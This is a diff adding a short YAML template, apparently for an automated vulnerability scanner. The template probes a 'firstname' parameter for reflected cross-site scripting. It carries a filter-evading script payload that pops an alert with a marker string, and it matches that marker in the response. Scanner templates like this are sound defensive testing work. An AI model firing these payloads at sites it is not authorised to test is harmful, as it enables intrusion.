@@ -1,0 +1,20 @@
+id: xss5-2536
+name: 'Raw XSS5 in firstname'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in firstname'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      firstname:
+        - '<ScRiPt%0a>alert(nx52535)</ScRiPt>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx52535'
